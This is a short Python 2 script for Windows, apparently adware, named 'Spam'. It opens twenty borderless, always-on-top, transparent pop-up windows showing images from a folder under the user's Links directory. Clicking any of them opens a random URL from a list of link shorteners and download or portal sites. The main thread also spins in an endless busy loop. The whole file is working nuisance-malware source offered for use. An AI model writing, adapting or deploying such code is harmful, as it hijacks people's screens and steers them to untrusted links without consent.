import  Tkinter, ctypes, random, getpass, webbrowser, thread

class Spam():
    def __init__(self):
        self.list = list()
        self.dir = 'C:\Users\%s\Links\MEDIA\\' % getpass.getuser()
        for i in range(ctypes.windll.user32.GetSystemMetrics(1)):
            self.list.append(str(i))

        thread.start_new_thread(self.main_window,())
        while True:
            pass

    def main_window(self):
        self.root = Tkinter.Tk()

        self.root.configure(background='snow')
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.wm_attributes("-transparentcolor", "snow")

        self.child_windows()
        self.root.mainloop()

    def child_windows(self):
        self.dict = {}
        def website(event):
            print("\a")

            urls = ['antivirus.baidu.com', 'www.hao123.com', 'softonic.com', 'ow.ly/hmtR302Ggft',
                    'ow.ly/8uOJ302GgiD', 'ow.ly/yvrO302Ggmk', 'ow.ly/1RWQ302Ggo8', 'bit.do/fsaaafFSDA33',
                    'tinyurl.com/qb9bpew']
            webbrowser.open(random.choice(urls))

        for i in range(20):
            self.dict[str(i)+'_img'] = Tkinter.PhotoImage(file=self.dir + 'SPAM\\%s' % (str(i) + '.gif') )
            self.dict[str(i)+'_win'] = Tkinter.Toplevel(self.root)
            self.dict[str(i) + '_win'].geometry('500x500+%s+%s' % (random.choice(self.list),
                                                                   random.choice(self.list)))
            self.dict[str(i) + '_win'].configure(background='snow')
            self.dict[str(i) + '_win'].overrideredirect(True)
            self.dict[str(i) + '_win'].attributes("-topmost", True)
            self.dict[str(i) + '_win'].wm_attributes("-transparentcolor", "snow")

            self.img1 = Tkinter.Label(self.dict[str(i) + '_win'],
                                      background='snow',image=self.dict[str(i)+'_img'])
            self.img1.bind("<Button-1>",website)
            self.img1.pack(anchor='center')


zz = Spam()
